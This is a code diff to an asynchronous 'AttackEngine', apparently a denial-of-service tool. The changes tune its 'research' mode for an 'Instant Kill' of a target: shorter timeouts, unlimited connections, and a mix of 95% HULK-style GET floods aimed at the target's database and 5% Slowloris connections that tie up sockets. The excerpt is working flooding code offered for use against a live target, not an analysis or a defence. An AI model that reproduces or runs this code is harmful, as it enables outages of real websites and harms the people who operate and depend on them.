@@ -296,24 +296,23 @@ class AttackEngine:
             await broadcast_log(f"Initializing {self.concurrency} workers in {mode_str} mode...", "info")
             
             connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
-            timeout = aiohttp.ClientTimeout(total=15, connect=5)
+            timeout = aiohttp.ClientTimeout(total=5, connect=2) # Tuned for Aggressive Speed
             
             async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                 try:
                     await broadcast_log(f"Verifying connectivity to {self.target}...", "info")
-                    async with session.get(self.target, timeout=5) as resp:
+                    async with session.get(self.target, timeout=3) as resp:
                         await broadcast_log(f"Target is REACHABLE. Status: {resp.status}", "success")
                 except Exception as e:
                     await broadcast_log(f"WARNING: Target check failed: {str(e)}", "warning")
                 
                 workers = []
                 if self.mode == "research":
-                    # Strategy: 90% DB Buster (HULK GETs), 10% Slowloris
-                    # We need High Volume to kill DB, but some Slowloris to annoy the web server
-                    slow_count = max(1, int(self.concurrency * 0.1))
+                    # Strategy: 95% DB Buster (HULK GETs), 5% Slowloris - Optimized for "Instant Kill"
+                    slow_count = max(1, int(self.concurrency * 0.05))
                     fast_count = self.concurrency - slow_count
                     
-                    await broadcast_log(f"Strategy: DB BUSTER ({fast_count} Search Queries + {slow_count} Sockets)", "info")
+                    await broadcast_log(f"Strategy: INSTANT DEMO ({fast_count} HULK + {slow_count} Slowloris)", "info")
                     
                     # Launch Slowloris Workers
                     for _ in range(slow_count):
